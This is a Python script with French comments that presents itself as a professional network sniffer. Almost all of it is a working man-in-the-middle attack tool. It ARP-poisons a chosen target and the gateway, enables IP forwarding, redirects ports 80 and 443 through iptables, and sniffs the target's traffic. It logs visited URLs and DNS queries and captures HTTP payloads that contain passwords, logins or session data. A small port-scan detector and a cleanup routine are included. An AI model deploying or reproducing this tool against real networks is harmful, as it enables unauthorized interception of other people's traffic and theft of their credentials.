#!/usr/bin/env python3
"""
Sniffer réseau professionnel avec ARP Spoofing
Fonctionnalités :
- Capture de tout le trafic réseau (mode promiscuité)
- ARP poisoning pour les réseaux commutés
- Analyse en temps réel (HTTP, DNS, etc.)
- Gestion des erreurs
- Nettoyage automatique des règles réseau
"""

import os
import sys
import time
import signal
import logging
from multiprocessing import Process
from scapy.all import *
from scapy.layers import http, dns

# Configuration globale
INTERFACE = "eth0"  # Interface réseau à utiliser
TARGET_IP = "192.168.1.X"  # IP de la machine cible
GATEWAY_IP = "192.168.1.254"  # IP de la passerelle (routeur)
LOG_FILE = "network_monitor.log"  # Fichier de logs

class AdvancedSniffer:
    def __init__(self):
        self.running = True
        self.arp_process = None
        self.syn_count = 0  # Initialisation du compteur SYN
        self.last_syn = time.time()  # Timestamp du dernier SYN
        self.setup_logger()
        self.check_privileges()
        self.setup_network()
        signal.signal(signal.SIGINT, self.signal_handler)

    def setup_logger(self):
        """Configuration de la journalisation professionnelle"""
        self.logger = logging.getLogger('NETWORK_MONITOR')
        self.logger.setLevel(logging.INFO)
        formatter = logging.Formatter('%(asctime)s :: %(levelname)s :: %(message)s')
        
        # Handler fichier
        file_handler = logging.FileHandler(LOG_FILE)
        file_handler.setFormatter(formatter)
        
        # Handler console
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(formatter)

        self.logger.addHandler(file_handler)
        self.logger.addHandler(console_handler)

    def check_privileges(self):
        """Vérification des privilèges root"""
        if os.geteuid() != 0:
            self.logger.error("Erreur : L'exécution nécessite les privilèges root!")
            sys.exit(1)

    def setup_network(self):
        """Configuration réseau avancée"""
        try:
            # Activation du forwarding IP
            os.system("sysctl -w net.ipv4.ip_forward=1")
            
            # Configuration iptables pour MITM
            for port in [80, 443]:  # HTTP et HTTPS
                os.system(f"iptables -t nat -A PREROUTING -i {INTERFACE} -p tcp --dport {port} -j REDIRECT --to-port 8080")
            
            self.logger.info("Configuration réseau terminée")
        except Exception as e:
            self.logger.error(f"Erreur de configuration réseau: {str(e)}")
            self.cleanup()
            sys.exit(1)

    def get_mac(self, ip):
        """Résolution MAC fiable avec timeout"""
        for _ in range(3):  # 3 tentatives
            mac = getmacbyip(ip)
            if mac:
                return mac
            time.sleep(1)
        raise ValueError(f"Impossible de trouver MAC pour {ip}")

    def arp_spoof(self):
        """ARP poisoning amélioré"""
        try:
            target_mac = self.get_mac(TARGET_IP)
            gateway_mac = self.get_mac(GATEWAY_IP)
        except ValueError as e:
            self.logger.error(str(e))
            return

        arp_target = ARP(op=2, pdst=TARGET_IP, psrc=GATEWAY_IP, hwdst=target_mac)
        arp_gateway = ARP(op=2, pdst=GATEWAY_IP, psrc=TARGET_IP, hwdst=gateway_mac)

        self.logger.info(f"ARP poisoning démarré entre {TARGET_IP} et {GATEWAY_IP}")

        while self.running:
            try:
                send(arp_target, verbose=0, iface=INTERFACE)
                send(arp_gateway, verbose=0, iface=INTERFACE)
                time.sleep(2)
            except Exception as e:
                self.logger.error(f"Erreur ARP: {str(e)}")
                break

    def packet_analysis(self, packet):
        """Analyse approfondie des paquets"""
        try:
            # Analyse HTTP
            if packet.haslayer(http.HTTPRequest):
                self.analyze_http(packet)
            
            # Analyse DNS
            elif packet.haslayer(dns.DNS):
                self.analyze_dns(packet)
            
            # Détection de scan de ports
            if TCP in packet and packet[TCP].flags == 'S':
                self.detect_port_scan(packet)

        except Exception as e:
            self.logger.warning(f"Erreur d'analyse: {str(e)}")

    def analyze_http(self, packet):
        """Extraction des informations HTTP sensibles"""
        url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
        self.logger.info(f"HTTP Request to: {url}")
        
        if packet.haslayer(Raw):
            payload = packet[Raw].load.decode(errors='ignore')
            keywords = ["password", "user", "login", "session"]
            for keyword in keywords:
                if keyword in payload.lower():
                    self.logger.warning(f"Credentials potentiels trouvés dans HTTP: {payload[:200]}")

    def analyze_dns(self, packet):
        """Analyse des requêtes DNS"""
        if packet[dns.DNSQR].qname:
            domain = packet[dns.DNSQR].qname.decode()
            self.logger.info(f"DNS Query: {domain}")
            
            # Détection de domaines suspects
            suspicious_domains = [".onion", "tor2web", "i2p"]
            if any(sd in domain for sd in suspicious_domains):
                self.logger.critical(f"Requête DNS suspecte détectée: {domain}")

    def detect_port_scan(self, packet):
        """Détection de scan de ports TCP SYN"""
        self.syn_count += 1
        if time.time() - self.last_syn > 1:
            self.syn_count = 0
            self.last_syn = time.time()
        else:
            if self.syn_count > 50:
                self.logger.critical(f"Port scanning détecté depuis {packet[IP].src}!")

    def start_sniffing(self):
        """Démarrage de la capture réseau"""
        self.logger.info("Démarrage de la surveillance réseau...")
        sniff_filter = f"host {TARGET_IP} or arp or udp port 53"
        
        try:
            sniff(
                iface=INTERFACE,
                filter=sniff_filter,
                prn=self.packet_analysis,
                store=False,
                promisc=True
            )
        except Exception as e:
            self.logger.error(f"Erreur de sniffing: {str(e)}")
            self.cleanup()

    def signal_handler(self, sig, frame):
        """Gestion propre de l'arrêt"""
        self.logger.info("Arrêt en cours...")
        self.running = False
        self.cleanup()
        sys.exit(0)

    def cleanup(self):
        """Nettoyage sécurisé des règles réseau"""
        self.logger.info("Nettoyage des règles réseau...")
        os.system("sysctl -w net.ipv4.ip_forward=0")
        
        # Suppression conditionnelle des règles iptables
        for port in [80, 443]:
            cmd = f"iptables -t nat -D PREROUTING -i {INTERFACE} -p tcp --dport {port} -j REDIRECT --to-port 8080"
            os.system(cmd + " 2>/dev/null")

if __name__ == "__main__":
    sniffer = AdvancedSniffer()
    
    # Démarrage de l'ARP spoofing dans un processus séparé
    sniffer.arp_process = Process(target=sniffer.arp_spoof)
    sniffer.arp_process.start()
    
    # Démarrage du sniffing
    sniffer.start_sniffing()
